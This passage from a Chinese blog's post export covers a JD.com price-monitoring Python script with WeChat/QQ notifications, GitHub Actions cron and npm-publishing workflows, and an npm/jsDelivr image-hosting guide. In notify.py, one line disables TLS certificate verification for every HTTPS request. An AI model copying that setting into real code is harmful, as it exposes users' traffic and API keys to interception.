请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 